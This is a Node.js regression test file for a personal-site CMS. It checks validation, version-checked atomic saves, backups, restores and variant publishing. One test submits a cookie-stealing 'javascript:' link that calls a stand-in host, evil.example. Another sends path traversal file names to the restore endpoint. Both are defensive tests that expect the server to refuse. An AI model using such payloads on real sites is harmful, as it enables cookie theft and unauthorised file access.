/**
 * Step 5: every write is validated, serialised, version-checked, backed up
 * outside the published directory, and atomic. The regression cases are the
 * bugs the audit reproduced against the old server.
 */
import { test, beforeEach, afterEach } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync, readdirSync, existsSync, statSync } from 'node:fs'
import path from 'node:path'
import { startCms } from './helpers.mjs'

let cms
beforeEach(async () => { cms = await startCms() })
afterEach(() => cms.close())

const get = async (variant) => {
  const r = await cms.call('GET', `/api/content${variant ? `?variant=${variant}` : ''}`)
  return { doc: r.json, etag: r.headers.etag, status: r.status }
}
const put = (doc, etag, variant) =>
  cms.call('PUT', `/api/content${variant ? `?variant=${variant}` : ''}`, { body: doc, headers: etag ? { 'if-match': etag } : {} })
const backups = () => readdirSync(cms.backupDir).sort()
const liveBytes = () => readFileSync(path.join(cms.contentDir, 'site.json'))

test('a normal edit saves, returns the new version, and backs up the old one', async () => {
  const { doc, etag } = await get()
  doc.profile.headline = 'Software engineer, now graduated'
  const r = await put(doc, etag)
  assert.equal(r.status, 200)
  assert.notEqual(r.json.etag, etag)
  assert.equal(r.headers.etag, r.json.etag)
  assert.equal(JSON.parse(liveBytes()).profile.headline, 'Software engineer, now graduated')
  assert.equal(backups().length, 1)
  assert.match(backups()[0], /^default\..+\.json$/)
})

test('CRITICAL regression: an emptied-then-added list item cannot blank the site', async () => {
  // The old editor's "+ Add" on an emptied list pushed {}, which the old
  // validate() accepted and which crashes Projects, Education and more.
  const { doc, etag } = await get()
  const before = liveBytes()
  doc.sections.find((s) => s.type === 'projects').items = [{}]
  const r = await put(doc, etag)
  assert.equal(r.status, 422)
  assert.ok(r.json.details.some((d) => d.includes('items[0]')), r.json.details.join('\n'))
  assert.deepEqual(liveBytes(), before, 'live document untouched')
  assert.equal(backups().length, 0, 'nothing written, so nothing backed up')
})

test('a javascript: link is refused', async () => {
  const { doc, etag } = await get()
  doc.profile.links.linkedin = 'javascript:fetch("//evil.example/?c="+document.cookie)'
  const r = await put(doc, etag)
  assert.equal(r.status, 422)
})

test('a save must say which version it edited, and a stale one is refused', async () => {
  const { doc, etag } = await get()
  const none = await put(doc, null)
  assert.equal(none.status, 428)
  const first = await put({ ...doc, meta: { ...doc.meta, title: 'Tab A' } }, etag)
  assert.equal(first.status, 200)
  // Tab B still holds the old version.
  const second = await put({ ...doc, meta: { ...doc.meta, title: 'Tab B' } }, etag)
  assert.equal(second.status, 412)
  assert.equal(second.json.etag, first.json.etag, 'tells the editor what the current version is')
  assert.equal(JSON.parse(liveBytes()).meta.title, 'Tab A', 'tab A\'s edit survived')
})

test('M1/M5 regression: 25 simultaneous saves cannot corrupt the file or lose an edit', async () => {
  const { doc, etag } = await get()
  const results = await Promise.all(
    Array.from({ length: 25 }, (_, i) => put({ ...doc, meta: { ...doc.meta, title: `save ${i}` } }, etag)),
  )
  const ok = results.filter((r) => r.status === 200)
  assert.equal(ok.length, 1, 'exactly one save wins')
  assert.ok(results.every((r) => r.status === 200 || r.status === 412))
  const live = JSON.parse(liveBytes()) // parses, so not corrupted
  assert.match(live.meta.title, /^save \d+$/)
  assert.deepEqual(readdirSync(path.join(cms.contentDir, '.staging')), [], 'no temp files left behind')
})

test('sequential saves, each on the latest version, all land in order', async () => {
  let { doc, etag } = await get()
  for (let i = 0; i < 8; i++) {
    doc.meta.title = `rev ${i}`
    const r = await put(doc, etag)
    assert.equal(r.status, 200)
    etag = r.json.etag
  }
  assert.equal(JSON.parse(liveBytes()).meta.title, 'rev 7')
  assert.equal(backups().length, 5, 'rotation keeps MAX_BACKUPS (5 in tests)')
})

test('H3 regression: saving a variant many times never deletes the live document\'s backups', async () => {
  let { doc, etag } = await get()
  doc.meta.title = 'live edit'
  etag = (await put(doc, etag)).json.etag // 1 backup of default
  assert.equal((await cms.call('POST', '/api/variants', { body: { name: 'recruiter' } })).status, 201)
  let v = await get('recruiter')
  for (let i = 0; i < 12; i++) {
    v.doc.meta.title = `recruiter ${i}`
    v.etag = (await put(v.doc, v.etag, 'recruiter')).json.etag
  }
  const all = backups()
  assert.equal(all.filter((f) => f.startsWith('default.')).length, 1, 'live backup survived')
  assert.equal(all.filter((f) => f.startsWith('recruiter.')).length, 5)
})

test('M3 regression: restoring a hyphenated variant\'s backup restores that variant, not live', async () => {
  await cms.call('POST', '/api/variants', { body: { name: 'old-recruiter' } })
  const v = await get('old-recruiter')
  v.doc.meta.title = 'changed'
  await put(v.doc, v.etag, 'old-recruiter')
  const liveBefore = liveBytes()
  const list = await cms.call('GET', '/api/backups?variant=old-recruiter')
  assert.equal(list.json.backups.length, 1)
  const r = await cms.call('POST', '/api/restore', { body: { file: list.json.backups[0].file } })
  assert.equal(r.status, 200)
  assert.equal(r.json.variant, 'old-recruiter')
  assert.deepEqual(liveBytes(), liveBefore, 'live untouched')
  assert.notEqual((await get('old-recruiter')).doc.meta.title, 'changed', 'variant rolled back')
})

test('restore of live backs up what it replaces, so a restore can itself be undone', async () => {
  const { doc, etag } = await get()
  doc.meta.title = 'mistake'
  await put(doc, etag)
  const [first] = (await cms.call('GET', '/api/backups?variant=default')).json.backups
  const r = await cms.call('POST', '/api/restore', { body: { file: first.file } })
  assert.equal(r.status, 200)
  assert.notEqual(JSON.parse(liveBytes()).meta.title, 'mistake')
  const after = (await cms.call('GET', '/api/backups?variant=default')).json.backups
  assert.equal(after.length, 2, 'the "mistake" version is now a backup too')
})

test('restore refuses names that are not backups', async () => {
  for (const file of ['../content/site.json', 'site.json', 'default-2026-01-01.json', '', 42]) {
    const r = await cms.call('POST', '/api/restore', { body: { file } })
    assert.equal(r.status, 400, String(file))
  }
})

test('M4 regression: a new variant can never overwrite live or an existing variant', async () => {
  assert.equal((await cms.call('POST', '/api/variants', { body: { name: 'default' } })).status, 400)
  assert.equal((await cms.call('POST', '/api/variants', { body: { name: 'recruiter' } })).status, 201)
  assert.equal((await cms.call('POST', '/api/variants', { body: { name: 'recruiter' } })).status, 409)
  assert.equal((await cms.call('POST', '/api/variants', { body: { name: 'Bad Name!' } })).status, 400)
  assert.equal((await cms.call('POST', '/api/variants', { body: { name: 'x', source: 'missing' } })).status, 404)
  const list = await cms.call('GET', '/api/variants')
  assert.deepEqual(list.json.variants, ['default', 'recruiter'])
})

test('publish copies a variant over live only if it is the version the editor showed', async () => {
  await cms.call('POST', '/api/variants', { body: { name: 'recruiter' } })
  const v = await get('recruiter')
  v.doc.profile.headline = 'Open to graduate roles'
  const saved = await put(v.doc, v.etag, 'recruiter')

  const noEtag = await cms.call('POST', '/api/publish', { body: { variant: 'recruiter' } })
  assert.equal(noEtag.status, 428)
  const stale = await cms.call('POST', '/api/publish', { body: { variant: 'recruiter' }, headers: { 'if-match': v.etag } })
  assert.equal(stale.status, 412)
  const ok = await cms.call('POST', '/api/publish', { body: { variant: 'recruiter' }, headers: { 'if-match': saved.json.etag } })
  assert.equal(ok.status, 200)
  assert.equal(JSON.parse(liveBytes()).profile.headline, 'Open to graduate roles')
  assert.ok(ok.json.backup.startsWith('default.'), 'the previous live version was backed up')
  assert.equal((await cms.call('POST', '/api/publish', { body: { variant: 'default' }, headers: { 'if-match': '"x"' } })).status, 400)
})

test('deleting a variant backs it up first; live cannot be deleted', async () => {
  await cms.call('POST', '/api/variants', { body: { name: 'temp' } })
  const r = await cms.call('DELETE', '/api/variants/temp')
  assert.equal(r.status, 200)
  assert.ok(r.json.backup.startsWith('temp.'))
  assert.equal(existsSync(path.join(cms.contentDir, 'site.temp.json')), false)
  assert.equal((await cms.call('DELETE', '/api/variants/default')).status, 400)
})

test('backups live outside the published directory and are not world-readable', async () => {
  const { doc, etag } = await get()
  await put(doc, etag)
  assert.ok(!cms.backupDir.startsWith(cms.contentDir))
  assert.deepEqual(readdirSync(cms.contentDir).filter((f) => !f.startsWith('.')).sort(), ['media', 'site.json'])
  const mode = statSync(path.join(cms.backupDir, backups()[0])).mode & 0o777
  assert.equal(mode, 0o600)
  const live = statSync(path.join(cms.contentDir, 'site.json')).mode & 0o777
  assert.equal(live & 0o044, 0o044, 'live file stays readable by Caddy')
})

test('writes are byte-stable: the file on disk is what the ETag describes', async () => {
  const { doc, etag } = await get()
  const r = await put(doc, etag)
  const again = await get()
  assert.equal(again.etag, r.json.etag)
})

test('leftover temp files from a crash are cleared on the next start', async () => {
  const { writeFileSync } = await import('node:fs')
  writeFileSync(path.join(cms.contentDir, '.staging', 'site.json.dead.tmp'), '{')
  const { createStore } = await import('../src/store.mjs')
  createStore(cms.config)
  assert.deepEqual(readdirSync(path.join(cms.contentDir, '.staging')), [])
})
